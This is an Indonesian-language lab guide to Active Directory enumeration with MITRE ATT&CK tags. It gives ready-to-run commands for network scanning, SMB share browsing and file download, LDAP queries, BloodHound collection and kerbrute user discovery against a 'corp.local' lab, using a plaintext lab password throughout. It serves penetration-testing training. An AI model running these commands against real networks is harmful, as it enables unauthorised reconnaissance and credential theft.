# 🔍 Skenario Serangan: Enumerasi

## Gambaran Umum

Enumerasi adalah fase pertama setelah mendapatkan akses ke jaringan. Tujuannya adalah mengumpulkan informasi sebanyak mungkin tentang domain, user, group, share, dan konfigurasi AD untuk menemukan attack path.

---

## Skenario 1: Network Scanning

**Tujuan:** Menemukan host aktif dan service yang berjalan di jaringan.

**MITRE ATT&CK:** T1046 — Network Service Discovery

**Penjelasan:** Nmap digunakan untuk menemukan mesin yang hidup dan port yang terbuka. Port tertentu mengindikasikan role mesin (contoh: port 88 = Kerberos = Domain Controller).

```bash
# Discover host aktif di subnet
nmap -sn 192.168.56.0/24

# Full port scan pada target yang ditemukan
nmap -sV -sC -p- 192.168.56.10 -oN recon/dc1_full_scan.txt

# Scan cepat pada semua target
nmap -sV -p 21,22,53,80,88,135,139,389,445,464,636,3268,3389,5985 \
    192.168.56.10-11,20,30 -oN recon/all_targets.txt
```

**Port penting yang dicari:**

| Port | Service | Indikasi |
|------|---------|----------|
| 88 | Kerberos | Domain Controller |
| 389/636 | LDAP/LDAPS | Domain Controller |
| 445 | SMB | File sharing, credential relay |
| 135 | RPC | Remote management |
| 3389 | RDP | Remote Desktop |
| 5985 | WinRM | Remote PowerShell |

---

## Skenario 2: SMB Enumeration

**Tujuan:** Menemukan shared folder, user, dan informasi domain melalui SMB.

**MITRE ATT&CK:** T1135 — Network Share Discovery

**Penjelasan:** SMB (Server Message Block) sering mengekspos informasi berharga seperti daftar share, user list, dan bahkan file yang berisi credential.

```bash
# Enumerasi SMB dengan enum4linux
enum4linux -a 192.168.56.10

# Atau versi modern
enum4linux-ng -A 192.168.56.10

# Enumerasi share menggunakan smbclient
smbclient -L //192.168.56.20 -U "j.doe%Welcome2024!"

# Akses share tanpa autentikasi (null session)
smbclient -L //192.168.56.20 -N

# Menggunakan CrackMapExec
crackmapexec smb 192.168.56.20 -u "j.doe" -p "Welcome2024!" --shares

# List file di share
smbclient //192.168.56.20/Public -U "j.doe%Welcome2024!" -c "ls"
smbclient //192.168.56.20/IT -U "j.doe%Welcome2024!" -c "ls"

# Download file menarik
smbclient //192.168.56.20/IT -U "j.doe%Welcome2024!" -c "get deploy_script.bat"
smbclient //192.168.56.20/IT -U "j.doe%Welcome2024!" -c "get db_config.txt"
```

---

## Skenario 3: LDAP Enumeration

**Tujuan:** Mengekstrak informasi domain lengkap: user, group, OU, computer, policy.

**MITRE ATT&CK:** T1018 — Remote System Discovery, T1087.002 — Account Discovery: Domain Account

**Penjelasan:** LDAP adalah protokol utama Active Directory untuk menyimpan dan query informasi domain. Siapa pun dengan akun domain valid bisa melakukan LDAP query yang sangat detail.

```bash
# Enumerasi dasar LDAP
ldapsearch -x -H ldap://192.168.56.10 -D "j.doe@corp.local" -w "Welcome2024!" \
    -b "DC=corp,DC=local" "(objectClass=user)" cn sAMAccountName description memberOf

# Cari semua user
ldapsearch -x -H ldap://192.168.56.10 -D "j.doe@corp.local" -w "Welcome2024!" \
    -b "DC=corp,DC=local" "(&(objectClass=user)(objectCategory=person))" sAMAccountName

# Cari Domain Admins
ldapsearch -x -H ldap://192.168.56.10 -D "j.doe@corp.local" -w "Welcome2024!" \
    -b "DC=corp,DC=local" "(&(objectClass=group)(cn=Domain Admins))" member

# Cari computer objects
ldapsearch -x -H ldap://192.168.56.10 -D "j.doe@corp.local" -w "Welcome2024!" \
    -b "DC=corp,DC=local" "(objectClass=computer)" cn operatingSystem

# Menggunakan ldapdomaindump (lebih rapi, output HTML)
ldapdomaindump -u "corp.local\\j.doe" -p "Welcome2024!" 192.168.56.10 -o recon/ldap_dump
```

---

## Skenario 4: BloodHound Collection

**Tujuan:** Mengumpulkan data AD dan memvisualisasikan attack path menuju Domain Admin.

**MITRE ATT&CK:** T1087.002 — Account Discovery: Domain Account

**Penjelasan:** BloodHound mengumpulkan informasi tentang session, ACL, group membership, dan trust, lalu menampilkannya sebagai graph yang memudahkan identifikasi jalur serangan.

### Opsi A: Dari Kali (menggunakan bloodhound-python)

```bash
# Install bloodhound-python
pip3 install bloodhound

# Collect data
bloodhound-python -u "j.doe" -p "Welcome2024!" -d "corp.local" \
    -ns 192.168.56.10 -c All --zip

# Output: file .zip yang bisa di-import ke BloodHound GUI
```

### Opsi B: Dari Target Windows (menggunakan SharpHound)

```powershell
# Transfer SharpHound.exe ke target, lalu jalankan:
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Atau menggunakan PowerShell version:
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp -ZipFileName bh.zip
```

### Import ke BloodHound

```bash
# Pastikan neo4j berjalan
sudo neo4j start

# Jalankan BloodHound
bloodhound

# Drag and drop file .zip ke BloodHound GUI
# Atau gunakan menu Upload Data
```

### Query BloodHound yang Berguna

Di BloodHound GUI, buka tab **Analysis** dan coba:

- **Find all Domain Admins** — lihat siapa saja DA
- **Shortest Paths to Domain Admins** — attack path tercepat
- **Find Principals with DCSync Rights** — siapa yang bisa DCSync
- **Find Computers with Unconstrained Delegation** — mesin dengan delegation
- **Shortest Paths to Unconstrained Delegation Systems** — jalur ke mesin delegation

---

## Skenario 5: Domain User Discovery

**Tujuan:** Mendapatkan daftar lengkap username valid di domain.

**MITRE ATT&CK:** T1087.002 — Account Discovery: Domain Account

```bash
# Menggunakan kerbrute (tidak butuh credential, memanfaatkan Kerberos)
kerbrute userenum --dc 192.168.56.10 -d corp.local /usr/share/wordlists/user_list.txt

# Buat wordlist username terlebih dahulu
cat > /tmp/users.txt << 'EOF'
administrator
j.doe
s.admin
helpdesk
m.dev
a.intern
l.jones
r.smith
d.wilson
k.brown
svc_backup
svc_sql
svc_web
guest
krbtgt
EOF

kerbrute userenum --dc 192.168.56.10 -d corp.local /tmp/users.txt

# Menggunakan CrackMapExec
crackmapexec smb 192.168.56.10 -u "j.doe" -p "Welcome2024!" --users

# Menggunakan Impacket
impacket-lookupsid corp.local/j.doe:Welcome2024!@192.168.56.10
```

---

## Checklist Hasil Enumerasi

Setelah fase enumerasi, kamu seharusnya sudah memiliki:

- [ ] Daftar host aktif dan port terbuka
- [ ] Daftar semua user domain
- [ ] Daftar group dan membership
- [ ] Daftar SMB share dan isinya
- [ ] Credential yang ditemukan di file share
- [ ] Daftar service account dengan SPN (target Kerberoasting)
- [ ] User tanpa pre-auth (target AS-REP Roasting)
- [ ] BloodHound graph dengan attack path teridentifikasi
- [ ] Mesin dengan unconstrained delegation
